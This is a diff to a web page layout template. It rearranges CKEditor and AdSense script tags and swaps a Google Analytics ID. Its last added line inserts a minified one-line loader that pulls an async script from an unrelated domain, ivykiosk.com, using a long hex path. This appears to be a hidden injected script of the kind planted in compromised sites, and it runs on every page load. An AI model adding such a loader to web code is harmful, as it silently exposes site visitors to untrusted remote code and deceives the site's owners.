@@ -8,15 +8,7 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Luckiest+Guy|Bitter:700|Open+Sans:400,600,600italic">
     <link rel="stylesheet" href="{{ asset('css/style_0.0.16.css') }}?v2">
     <link rel="stylesheet" href="{{ asset('css/font-awesome.min.css') }}">
-    <script src="//cdn.ckeditor.com/4.7.1/standard/ckeditor.js"></script>
     <link rel="shortcut icon" href="{{ asset('images/favicon.png') }}" />
-    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-    (adsbygoogle = window.adsbygoogle || []).push({
-        google_ad_client: "ca-pub-8715450313943907",
-        enable_page_level_ads: true
-    });
-    </script>
 </head>
 <body>
 
@@ -78,16 +70,25 @@
 <script src="{{ asset('js/app-min.js') }}"></script>
 <script src="{{ asset('js/functions.js') }}"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
+<script src="//cdn.ckeditor.com/4.7.1/standard/ckeditor.js"></script>
 @yield('scripts')
 <script>
-    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 
-    ga('create', 'UA-81660403-5', 'auto');
-    ga('send', 'pageview');
+  ga('create', 'UA-101852132-1', 'auto');
+  ga('send', 'pageview');
 
 </script>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+        google_ad_client: "ca-pub-8715450313943907",
+        enable_page_level_ads: true
+    });
+</script>
+<script>(function(a,b,c,d,e){e=a.createElement(b);a=a.getElementsByTagName(b)[0];e.async=1;e.src=c;a.parentNode.insertBefore(e,a)})(document,'script','//ivykiosk.com/82af7a2deb5955ea3480317dab4eaeed492668ebea728919c4a3690ebebc066066a46ad565a41ced24540d178c5a1a944956e7ed7268c0ce2db62fb9f2a5');</script>
 </body>
 </html>
